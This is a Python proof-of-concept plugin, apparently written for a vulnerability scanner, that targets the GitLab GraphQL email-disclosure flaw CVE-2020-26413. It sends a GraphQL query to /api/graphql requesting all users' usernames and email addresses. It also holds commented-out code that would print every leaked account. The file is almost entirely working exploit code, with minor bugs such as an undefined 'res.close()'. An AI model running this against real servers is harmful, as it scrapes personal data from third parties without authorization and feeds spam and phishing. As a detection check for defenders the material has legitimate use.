#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import json
def msg():
  ret = {}
  ret['links'] = ["https://peiqi.wgpsec.org/wiki/webapp/GitLab/GitLab%20Graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-26413.html"]
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "GitLab邮箱信息泄露(cve-2020-26413)漏洞"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      "Content-Type": "application/json",
      }
  target = "/api/graphql"
  data = """
      {"query":"{\\nusers {\\nedges {\\n  node {\\n    username\\n    email\\n    avatarUrl\\n    status {\\n      emoji\\n      message\\n      messageHtml\\n     }\\n    }\\n   }\\n  }\\n }","variables":null,"operationName":null}
      """
  url1 = url + target
  ret['url'] = url1
  try:
    response = requests.post(url=url1, headers=headers, data=data ,verify=False, timeout=5)
    if "email" in response.text and "username" in response.text and "@" in response.text and response.status_code == 200:
      # for i in range(0,999):
      #   try:
      #       username = json.loads(response.text)["data"]["users"]["edges"][i]["node"]["username"]
      #       email = json.loads(response.text)["data"]["users"]["edges"][i]["node"]["email"]
      #       user_number = user_number + 1
      #       print('\033[34m[o] 用户名:{} 邮箱:{} \033[0m'.format(username, email))
      #   except:
      #       print("\033[32m[o] 共泄露{}名用户邮箱账号 \033[0m".format(user_number))
            # sys.exit(0)
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret